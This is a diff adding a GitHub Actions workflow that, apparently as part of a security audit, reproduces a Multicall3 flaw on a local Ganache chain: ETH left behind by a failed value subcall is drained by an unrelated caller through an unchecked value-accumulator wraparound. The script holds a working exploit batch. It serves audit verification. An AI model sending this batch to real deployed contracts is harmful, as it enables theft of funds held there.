@@ -1,0 +1,138 @@
+name: R7 Audit Basic Multicall3 Local Retained Balance Drain
+
+on:
+  push:
+    branches:
+      - velmere-r7-successor-delta-20260825
+    paths:
+      - '.github/workflows/r7-audit-basic-multicall3-local-balance-drain.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  bounded-local-only-drain-reproduction:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: Setup Node 24.18.0
+        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
+        with:
+          node-version: '24.18.0'
+          check-latest: false
+
+      - name: Install pinned local EVM stack
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p r7-drain-work artifacts/r7/audit-basic/drain
+          cd r7-drain-work
+          npm init -y >/dev/null
+          npm install --audit=false --fund=false solc@0.8.12 ethers@6.15.0 ganache@7.9.2
+
+      - name: Reproduce retained-balance drain only on local Ganache
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > r7-drain-work/run.mjs <<'NODE'
+          import { createHash } from 'node:crypto';
+          import fs from 'node:fs';
+          import ganache from 'ganache';
+          import solc from 'solc';
+          import { ContractFactory, Interface, JsonRpcProvider, MaxUint256 } from 'ethers';
+
+          const sha=(v)=>createHash('sha256').update(v).digest('hex');
+          const deployed='0xca11bde05977b3631167028862be2a173976ca11';
+          const sourceSha='3f05fc95b3bfd3d41e96fa281e00a71302e35b8fff59f81f399a419cdb9f577e';
+          const sr=await fetch(`https://sourcify.dev/server/v2/contract/56/${deployed}?fields=all`,{headers:{accept:'application/json','user-agent':'velmere-r7-local-drain'},signal:AbortSignal.timeout(25000)});
+          if(!sr.ok) throw new Error(`sourcify_fetch_failed:${sr.status}`);
+          const sc=await sr.json(); if(sc.match!=='exact_match') throw new Error('sourcify_not_exact_match');
+          const rows=Object.entries(sc.sources??{}).filter(([p,v])=>/Multicall3\.sol$/i.test(p)&&v&&typeof v==='object'&&typeof v.content==='string');
+          if(rows.length!==1) throw new Error(`source_denominator:${rows.length}`);
+          const source=rows[0][1].content; if(sha(Buffer.from(source,'utf8'))!==sourceSha) throw new Error('source_sha_mismatch');
+          const probe=`// SPDX-License-Identifier: MIT\npragma solidity 0.8.12; contract Probe { function failCall() external payable { revert(\"probe fail\"); } }`;
+          const input={language:'Solidity',sources:{'Multicall3.sol':{content:source},'Probe.sol':{content:probe}},settings:{optimizer:{enabled:true,runs:10000000},evmVersion:'london',outputSelection:{'*':{'*':['abi','evm.bytecode.object']}}}};
+          const out=JSON.parse(solc.compile(JSON.stringify(input))); const errors=(out.errors??[]).filter(e=>e.severity==='error'); if(errors.length) throw new Error(errors.map(e=>e.formattedMessage).join('\n'));
+          const mc=out.contracts['Multicall3.sol'].Multicall3, pc=out.contracts['Probe.sol'].Probe;
+          const server=ganache.server({logging:{quiet:true},wallet:{totalAccounts:4,defaultBalance:1000},chain:{hardfork:'london',chainId:1337}}); await server.listen(8545);
+          const tests=[]; const check=(id,pass,details={})=>{tests.push({id,pass,...details}); if(!pass) throw new Error(`drain_test_failed:${id}:${JSON.stringify(details)}`);};
+          try {
+            const provider=new JsonRpcProvider('http://127.0.0.1:8545');
+            const owner=await provider.getSigner(0), thirdParty=await provider.getSigner(1), sink=await provider.getSigner(2);
+            const sinkAddr=await sink.getAddress();
+            const multicall=await new ContractFactory(mc.abi,'0x'+mc.evm.bytecode.object,owner).deploy(); await multicall.waitForDeployment();
+            const probeContract=await new ContractFactory(pc.abi,'0x'+pc.evm.bytecode.object,owner).deploy(); await probeContract.waitForDeployment();
+            const mcAddr=await multicall.getAddress(), probeAddr=await probeContract.getAddress(); const iface=new Interface(pc.abi); const failData=iface.encodeFunctionData('failCall',[]);
+            const bal=async(a)=>BigInt(await provider.send('eth_getBalance',[a,'latest']));
+
+            // Stage 1: reproduce the already-confirmed documented-invariant violation locally.
+            const retainTx=await multicall.connect(owner).aggregate3Value([{target:probeAddr,allowFailure:true,value:77n,callData:failData}],{value:77n});
+            const retainRc=await retainTx.wait(); check('retention_outer_transaction_succeeds',retainRc?.status===1);
+            const retained=await bal(mcAddr); check('retained_balance_is_77_wei',retained===77n,{multicallBalanceWei:String(retained)});
+
+            // Control: the drain-shaped batch must fail when there is no pre-existing balance.
+            const emptyMulticall=await new ContractFactory(mc.abi,'0x'+mc.evm.bytecode.object,owner).deploy(); await emptyMulticall.waitForDeployment();
+            const emptyAddr=await emptyMulticall.getAddress();
+            const wrapValue=MaxUint256-76n; // 77 + wrapValue == 2^256 -> 0 in unchecked uint256 arithmetic.
+            let emptyReverted=false;
+            try { await emptyMulticall.connect(thirdParty).aggregate3Value([{target:sinkAddr,allowFailure:false,value:77n,callData:'0x'},{target:sinkAddr,allowFailure:true,value:wrapValue,callData:'0x'}],{value:0n}); } catch { emptyReverted=true; }
+            check('same_batch_without_existing_balance_reverts',emptyReverted,{emptyMulticallBalanceWei:String(await bal(emptyAddr))});
+
+            // Stage 2: bounded local reproduction of whether an unrelated caller can spend the retained balance.
+            const sinkBefore=await bal(sinkAddr), mcBefore=await bal(mcAddr);
+            const drainTx=await multicall.connect(thirdParty).aggregate3Value([{target:sinkAddr,allowFailure:false,value:77n,callData:'0x'},{target:sinkAddr,allowFailure:true,value:wrapValue,callData:'0x'}],{value:0n});
+            const drainRc=await drainTx.wait(); check('third_party_zero_value_outer_transaction_succeeds',drainRc?.status===1);
+            const sinkAfter=await bal(sinkAddr), mcAfter=await bal(mcAddr);
+            check('retained_balance_transferred_to_unrelated_sink',sinkAfter-sinkBefore===77n,{sinkDeltaWei:String(sinkAfter-sinkBefore)});
+            check('multicall_retained_balance_fully_drained',mcBefore===77n&&mcAfter===0n,{beforeWei:String(mcBefore),afterWei:String(mcAfter)});
+
+            const receipt={
+              schemaVersion:'velmere.r7.audit-basic-multicall3-local-balance-drain.v1',
+              status:'PASS_LOCAL_ONLY_RETAINED_BALANCE_DRAIN_REPRODUCED',
+              executionBoundary:'LOCAL_GANACHE_ONLY_NO_PUBLIC_CHAIN_TRANSACTION',
+              exactDeployedSourceSha256:sourceSha,
+              compilerVersion:solc.version(),
+              optimizerRuns:10000000,
+              evmVersion:'london',
+              tests,
+              passed:tests.filter(t=>t.pass).length,
+              total:tests.length,
+              confirmedSecurityChain:{
+                retainedValuePath:true,
+                uncheckedAccumulatorWrapRequired:true,
+                unrelatedCallerMsgValueWei:'0',
+                retainedBalanceBeforeWei:'77',
+                unrelatedSinkReceivedWei:'77',
+                retainedBalanceAfterWei:'0',
+                publicChainExploitAttempted:false
+              },
+              findingCandidate:{
+                id:'MC3-RETAINED-BALANCE-THIRD-PARTY-DRAIN',
+                state:'CONFIRMED_LOCAL_EXPLOITABILITY_REQUIRES_HUMAN_SEVERITY_REVIEW',
+                severityCandidate:'high',
+                confidence:99,
+                title:'Retained ETH can be drained by an unrelated caller through unchecked value-accumulator wraparound',
+                impact:'Any ETH left on Multicall3 by a failure-tolerant value subcall can be transferred to an unrelated recipient by a later caller without contributing equivalent ETH in that transaction.',
+                precondition:'Multicall3 holds an ETH balance. A separate confirmed path can create such a balance when aggregate3Value uses nonzero value with allowFailure=true and that subcall fails.',
+                documentationAlignment:'The upstream project explicitly states the contract must never hold funds after a transaction and warns that held funds can be stolen.',
+                productionChainAction:'NOT_EXECUTED',
+                requiresQualifiedHumanReview:true
+              },
+              customerFinalCredit:false,
+              truthBoundary:'This reproduces exploitability only on an isolated local EVM using the exact deployed source. No public-chain transaction, theft, fund movement, or exploitation was attempted. Human severity/business-logic review remains mandatory.'
+            };
+            fs.writeFileSync('../artifacts/r7/audit-basic/drain/R7_AUDIT_BASIC_MULTICALL3_LOCAL_BALANCE_DRAIN.json',JSON.stringify(receipt,null,2)+'\n');
+            console.log(JSON.stringify(receipt,null,2));
+          } finally { await server.close(); }
+          NODE
+          cd r7-drain-work
+          node run.mjs
+
+      - name: Upload bounded local reproduction evidence
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: r7-audit-basic-local-balance-drain-${{ github.sha }}-${{ github.run_id }}
+          path: artifacts/r7/audit-basic/drain/R7_AUDIT_BASIC_MULTICALL3_LOCAL_BALANCE_DRAIN.json
+          if-no-files-found: error
+          retention-days: 30
